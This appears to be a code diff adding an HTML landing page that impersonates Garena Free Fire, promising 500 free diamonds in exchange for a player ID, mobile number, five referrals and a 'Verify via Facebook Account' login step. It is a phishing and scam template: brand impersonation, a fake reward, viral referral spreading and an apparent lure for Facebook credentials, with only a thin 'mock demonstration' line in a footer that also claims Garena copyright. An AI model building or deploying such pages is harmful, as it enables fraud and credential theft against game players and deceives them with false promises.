@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Claim 500 Free Diamonds in Garena Free Fire! Connect your Player ID, complete the invite challenge, and claim your rewards instantly.">
+    <title>Garena Free Fire | Free 500 Diamonds seasonal Crate Event</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Garena Free Fire Themed Header -->
+    <header>
+        <div class="container header-content">
+            <div class="logo">
+                <span class="logo-icon">🔥</span>
+                <span>FREE FIRE REWARDS</span>
+            </div>
+            <div class="badge-online">
+                <div class="pulse-dot"></div>
+                <span>12,408 Players Online</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main>
+        <div class="container hero-grid">
+            
+            <!-- Left Panel: Event Info -->
+            <div class="hero-info">
+                <div class="event-tag">Garena Event Office</div>
+                <h1>Claim <span class="highlight-gradient">500 Diamonds</span> in Free Fire</h1>
+                <p class="hero-subtitle">
+                    Welcome to the Garena Free Fire seasonal rewards distribution page. Enter your Free Fire Player ID, complete the referral task, and verify your account to receive your free diamond crate instantly in your vault.
+                </p>
+                <div class="features-list">
+                    <div class="feature-item">
+                        <div class="feature-icon">✓</div>
+                        <span>Direct delivery to Garena Vault</span>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">✓</div>
+                        <span>Secure player validation - No password required for connection</span>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">✓</div>
+                        <span>Compatible with all server regions</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right Panel: Interactive Reward Console -->
+            <div class="reward-console" id="rewardConsole">
+                <div class="reward-badge">Free Fire Diamond Event</div>
+                
+                <div class="reward-preview">
+                    <!-- Custom Styled Diamond for Free Fire (Cyan shape on fiery ground) -->
+                    <div class="diamond-icon">💎</div>
+                    <div class="reward-amount">500 <span>Diamonds</span></div>
+                    <p class="reward-desc">Garena Season Diamond Crate</p>
+                </div>
+
+                <!-- 3-Step Dashboard -->
+                <div class="step-container">
+                    
+                    <!-- Step 1: Connect Player Account -->
+                    <div class="step-card active" id="step1Card">
+                        <div class="step-header">
+                            <div class="step-number">1</div>
+                            <div class="step-title">Connect Player Account</div>
+                        </div>
+
+                        <!-- Player ID Form -->
+                        <div class="form-container" id="connectionForm">
+                            <div class="input-group">
+                                <label for="playerId">Free Fire Player ID</label>
+                                <input type="number" id="playerId" placeholder="e.g., 284719482" required>
+                            </div>
+                            <div class="input-group">
+                                <label for="phoneNumber">Mobile Number</label>
+                                <input type="tel" id="phoneNumber" placeholder="e.g., +1234567890" required>
+                            </div>
+                            <button class="btn-action" id="connectBtn" style="margin-top: 10px;">Connect Player Account</button>
+                        </div>
+
+                        <!-- Connecting Status Screen (hidden initially) -->
+                        <div class="status-console" id="statusConsole" style="display: none;">
+                            <div class="spinner"></div>
+                            <div class="console-logs" id="consoleLogs"></div>
+                        </div>
+
+                        <!-- Success Label (hidden initially) -->
+                        <div class="success-alert" id="connectionSuccess" style="display: none;">
+                            <span class="success-icon">✓</span>
+                            <div>
+                                <h4 id="playerNameDisplay" style="margin: 0; font-size: 14px; font-weight: 700; color: #fff;">Account linked securely.</h4>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Step 2: Share and Refer Link -->
+                    <div class="step-card locked" id="step2Card">
+                        <div class="step-header">
+                            <div class="step-number">2</div>
+                            <div class="step-title">Share Event & Invite Friends</div>
+                        </div>
+                        
+                        <!-- Referral Link UI -->
+                        <div class="link-box">
+                            <input type="text" class="referral-url" id="referralUrl" readonly value="https://freefire.diamondhub.event/claim?ref=ff92a">
+                            <div class="link-icon-badge">🔗</div>
+                        </div>
+
+                        <!-- Progress Tracker -->
+                        <div class="progress-container" style="margin-bottom: 20px;">
+                            <div class="progress-header">
+                                <span>Referrals Needed</span>
+                                <span id="progressText">0 / 5 Invited</span>
+                            </div>
+                            <div class="progress-bar-bg">
+                                <div class="progress-bar-fill" id="progressBar"></div>
+                            </div>
+                        </div>
+
+                        <div class="simulator-actions">
+                            <button class="btn-action" id="shareBtn">Share Referral Link</button>
+                        </div>
+                    </div>
+
+                    <!-- Step 3: Secure Account Claim -->
+                    <div class="step-card locked" id="step3Card">
+                        <div class="step-header">
+                            <div class="step-number">3</div>
+                            <div class="step-title">Account Verification & Claim</div>
+                        </div>
+                        
+                        <div class="claim-actions">
+                            <button class="btn-login btn-facebook" id="facebookLoginBtn">
+                                <img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" alt="Facebook Logo" class="login-icon-img">
+                                <span>Verify via Facebook Account</span>
+                            </button>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+
+    <!-- Toast Notifications Container -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 Garena International. All Rights Reserved. This event is a mock demonstration and not affiliated directly with standard Garena servers.</p>
+        </div>
+    </footer>
+
+    <script src="app.js"></script>
+</body>
+</html>
